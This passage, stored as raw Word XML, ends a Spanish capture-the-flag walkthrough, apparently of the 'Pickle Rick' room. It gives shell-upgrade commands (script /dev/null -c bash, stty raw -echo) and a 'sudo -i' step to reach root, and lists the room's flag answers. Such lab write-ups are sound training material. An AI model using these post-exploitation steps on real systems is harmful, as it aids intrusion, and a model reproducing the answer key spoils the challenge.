descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206215049499.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId39" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="3937000" cy="622300" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="40" w:name="fig10" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>10</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="40" /></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">mr. meeseek hair</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">Una buena práctica es ejecutar las siguientes lineas mostradas abajo, para poder crear una consola mucho más interactiva:</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="SourceCode" /></w:pPr><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">script /dev/null -c bash</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">control z</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">stty raw -echo; fg</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">reset</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">xterm</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">export TERM=xterm</w:t></w:r><w:r><w:br /></w:r><w:r><w:rPr><w:rStyle w:val="VerbatimChar" /></w:rPr><w:t xml:space="preserve">export SHELL=bash</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Ya que tenemos nuestra consola interactiva, procedemos a buscar nuestro segundo ingrediente. Primero buscaremos entre los archivos de la ruta /var/www/html, me encontré que el archivo clue.txt dice lo mostrado en la imagen.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="1606500" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206233139514.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId41" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="1606500" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="42" w:name="fig11" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>11</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="42" /></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">What is the first ingredient Rick needs?</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">mr. meeseek hair</w:t></w:r></w:p><w:p><w:r><w:pict><v:rect style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" /></w:pict></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Leido lo que dice el archivo, y deduciendo que es una máquina easy, fuimos a home, encontramos un user llamado rick, accedemos a su dir y encontraremos al archivo que buscamos.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="5334000" cy="595027" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206233441371.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId43" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="5334000" cy="595027" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="44" w:name="fig12" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>12</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="44" /></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">Whats the second ingredient Rick needs?</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">1 jerry tear</w:t></w:r></w:p><w:p><w:r><w:pict><v:rect style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" /></w:pict></w:r></w:p><w:p><w:pPr><w:pStyle w:val="FirstParagraph" /></w:pPr><w:r><w:t xml:space="preserve">Por deducción, imagino que el tercer archivo debe estar dentro de root, pero para poder acceder a este dir necesitamos tener privilegios, uno de los comandos más comunes que tenemos que utilizar es &quot;</w:t></w:r><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">sudo -i</w:t></w:r><w:r><w:t xml:space="preserve">&quot; y efectivamente tenemos el root, ya podemos dirigirnos a /root y hacerle un cat a nuestro tercer archivo.</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="CaptionedFigure" /></w:pPr><w:r><w:drawing><wp:inline><wp:extent cx="4038600" cy="2247900" /><wp:effectExtent b="0" l="0" r="0" t="0" /><wp:docPr descr="" title="" id="1" name="Picture" /><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr descr="C:\Users\EliteBook%20840%20G3\AppData\Roaming\Typora\typora-user-images\image-20211206233638310.png" id="0" name="Picture" /><pic:cNvPicPr><a:picLocks noChangeArrowheads="1" noChangeAspect="1" /></pic:cNvPicPr></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId45" /><a:stretch><a:fillRect /></a:stretch></pic:blipFill><pic:spPr bwMode="auto"><a:xfrm><a:off x="0" y="0" /><a:ext cx="4038600" cy="2247900" /></a:xfrm><a:prstGeom prst="rect"><a:avLst /></a:prstGeom><a:noFill /><a:ln w="9525"><a:noFill /><a:headEnd /><a:tailEnd /></a:ln></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p><w:p><w:pPr><w:pStyle w:val="ImageCaption" /></w:pPr><w:bookmarkStart w:id="46" w:name="fig13" /><w:r><w:t xml:space="preserve">Figure </w:t></w:r><w:fldSimple w:instr="SEQ Figure \* ARABIC "><w:r><w:t>13</w:t></w:r></w:fldSimple><w:r><w:t xml:space="preserve">:</w:t></w:r><w:r><w:t xml:space="preserve"> </w:t></w:r><w:bookmarkEnd w:id="46" /></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:rPr><w:bCs /><w:b /></w:rPr><w:t xml:space="preserve">Whats the final ingredient Rick needs?</w:t></w:r></w:p><w:p><w:pPr><w:pStyle w:val="BodyText" /></w:pPr><w:r><w:t xml:space="preserve">fleeb juice</w:t></w:r></w:p><w:bookmarkEnd w:id="47" /><w:sectPr /></w:body></w:document>